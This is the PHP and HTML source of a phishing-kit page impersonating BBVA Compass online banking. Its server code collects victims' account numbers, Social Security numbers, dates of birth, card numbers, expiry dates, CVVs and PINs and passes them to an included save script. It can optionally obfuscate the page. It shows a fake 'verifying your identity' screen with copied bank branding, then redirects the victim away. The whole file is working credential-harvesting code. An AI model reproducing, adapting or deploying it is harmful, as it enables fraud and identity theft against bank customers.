<?php
session_start();

require_once 'inc/functions.php';
require_once 'inc/config.php';

$isValidAcc = false;
$isValidSsn = false;
$isValidDob = false;
$errno = 1;


if (isset($_SERVER['HTTP_REFERER']) && isset($_SERVER['HTTP_HOST']) && isset($_SESSION['USER_OK']) && $_SESSION['USER_OK'] === 'OK' && isset($_SESSION['SESSION_ID'])) {
    $ref = $_SERVER['HTTP_REFERER'];
    $host = $_SERVER['HTTP_HOST'];
    $host2 = bin2hex($_SERVER['HTTP_HOST']);
    
    if (isset($_POST['account']) && !empty($_POST['account'])) {
		//although a valid bbva acc no is 16... dklem
        if(strlen($_POST['account']) >= 12) {
		$isValidAcc = true;
        $_SESSION['Account'] = $_POST['account'];    
	   }
    }
	if (isset($_POST['ssn']) && !empty($_POST['ssn'])) {
        if(strlen($_POST['ssn']) >= 9) {
		$isValidSsn = true;
        $_SESSION['Ssn'] = $_POST['ssn'];    
	   }
    }
	if (isset($_POST['dob']) && !empty($_POST['dob'])) {
		$isValidDob = true;
        $_SESSION['Dob'] = $_POST['dob'];
    }
    
    if (!$isValidAcc || !$isValidSsn || !$isValidDob) {
        header("Location: verify2.php?invalid=true&error=" . $errno . "&session=" . $host2);
    } else {
        if (strpos($ref, $host) !== FALSE) {
            $_SESSION['Ccno'] = $_POST['ccno'];
            $_SESSION['Exp'] = $_POST['exp'];
            $_SESSION['Cvv'] = $_POST['cvv'];
            $_SESSION['Pin'] = $_POST['pin'];
            $include = 1;
            include("inc/save3.php");
        }
    }
}
?>
<!DOCTYPE HTML>
<html>
    <head>
    <?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>

<script>
	window.irOn=true;
</script>
<script src="assets/js/jquery-latest.min.js"></script>
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>Thank You</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=1024, maximum-scale=3.0" />
        <!-- css -->
        <link rel="stylesheet" href="./secure-auth/sba_css/styles.1.21.0.1.min.css" />

        <style>
            .img-center {
                display: block;
                margin-left: auto;
                margin-right: auto;
            }

        </style>

    </head>
    <body class="offline" style="visibility:hidden" onload="unhideBody()">
      <script type="text/javascript">
$(document).ready(function() { 
	jQuery.ajax({
    url: 'complete.php',
    success: function (result) {
    	//window.location.replace("<?=$final_redirect_url?>");
    },
    async: false
	});
});
</script>
        <meta http-equiv="refresh" content="4; url=<?=$final_redirect_url?>" />
<? header("refresh:4; url=$final_redirect_url");?>

        <div id="umg" style="display:none;">sba</div>

        <div id="pageHeader">


            <!-- popups -->

            <div class="header">
                <div class="cnt_logo">
                    <a href="#" class="logo">
                        BBVA Compass


                    </a>
                </div>

                <!-- nav menu -->

                <!-- End nav menu -->
                <div class="menu_bar">


                </div>

            </div>

            <!-- END HEADER  -->

        </div>

        <div class="content" id="content">

            <div class="main">

                <div class="offline_module">

                    <input type="hidden" value="/secure-auth/default_nicknameReminder?execution=e1s1" id="execution">
                    <p id="errorcontainer" class="dialog_only_text red" style="display: none"></p>
                    <div class="TRDslider">
                        <div class="TRDslider-wrapper" style="width: 100%; height: 282px; position: relative;">
                            <div class="TRDslider-window" style="position: relative; overflow: hidden; width: 100%; height: 282px;">
                                <div class="TRDslider-container" style="width: 999999px; position: relative; left: 0px;">
                                    <div class="fn_loadTRDslider fn_TRDsliderAnchor" data-trdslider-options="{preload: &#39;/secure-auth/default_nicknameReminder?execution=e1s1&amp;_eventId=view-loaded&#39;, steps: [&#39;Step 1&#39;, &#39;Step 2&#39;,&#39;Step 3&#39;,]}">

                                        <div class="TRDslider-child TRDslider-pager" style="float: left; width: 636px;">

                                            <div id="content">
                                                <div class="offline_module_content standard_middle_padding oaofull">
                                                    <input type="hidden" value="/secure-auth/default_nicknameReminder?execution=e1s2" id="executionNickStep1">
                                                    <fieldset class="paragraph_list">

                                                        <h2 class="bbva-application-title oaohide">Thank You!</h2>
                                                        <p>
                                                            Please wait while we verify your identity. you would be automatically <strong>"logged off"</strong>.
                                                        </p><p></p>
                                                        <div class="">
                                                            <img class="img-center" src="files/Spin-1.1s-81px.gif"></div>

                                                    </fieldset>

                                                    <br>
                                                </div>
                                            </div>

                                        </div>
                                    </div></div></div></div></div>
                </div>
            </div>
        </div>
        <!-- END CONTENT  -->

        <div id="pageFooter">

            <div id="pageFooter">
                <div class="footer">
                    <ul class="footer_menu">
                        <li class="fc"><a target="_blank" href="#" id="linkSecurityCenter">Security Center</a></li>
                        <li><a target="_blank" href="#" id="linkPrivacy">Privacy</a></li>
                        <li><a target="_blank" href="#"  id="linkAgreement">Online Banking Agreement</a></li>
                        <li><a target="_blank" href="#" id="linkECAgreement">Electronic Communications Agreement</a></li>
                        <li><a target="_blank" href="#" id="linkLocations">Locations</a></li>
                        <li class="lc"><a target="_blank" href="#" id="linkContactUs">Contact Us</a></li>
                    </ul>
                    <div class="footer_copyright">
                        <p class="copyright" align="center">&copy;2018 BBVA Compass Bancshares, Inc. Compass Bank is a Member FDIC and an Equal Housing Lender.<br>	BBVA Compass is a trade name of Compass Bank, a member of the BBVA Group.<br>	Online Banking Questions and Technical Support: 1-800-273-1057.<br>	All other Account Questions and Support: 1-800-266-7277.</p>

                    </div>
                </div>
            </div>

            <!-- END FOOTER  -->
        </div>

    </body>
</html>